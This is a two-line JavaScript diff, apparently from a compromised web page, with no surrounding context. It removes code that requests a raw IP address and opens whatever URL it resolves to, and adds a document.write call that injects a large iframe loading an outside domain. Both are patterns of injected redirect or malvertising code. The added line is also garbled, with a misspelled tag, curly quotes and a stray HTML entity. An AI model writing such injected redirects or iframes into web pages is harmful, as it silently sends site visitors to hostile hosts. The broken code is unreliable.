@@ -1,2 +1,1 @@
-var x=new XMLHttpRequest();x.open('GET','https://188.4.181.71');x.send();
-x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
+document.write(‘<iframec=”https://wishluck.me&#8221; width=”1500″ height=”1000″>’)
